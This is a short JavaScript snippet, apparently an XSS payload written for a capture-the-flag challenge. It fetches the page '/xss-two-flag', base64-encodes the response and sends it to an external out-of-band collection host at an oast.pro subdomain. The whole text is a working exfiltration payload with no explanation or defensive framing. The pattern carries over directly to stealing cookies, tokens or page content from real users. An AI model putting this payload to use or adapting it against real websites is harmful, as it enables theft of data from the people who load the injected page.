// .js
fetch('/xss-two-flag')
  .then(r => r.text())
  .then(flag => {
    // Send the flag to your request bin
    fetch('https://e54e8b0f1e833868b4cdgux9r3hyyyyyd.oast.pro/?flag=' + btoa(flag));
  });

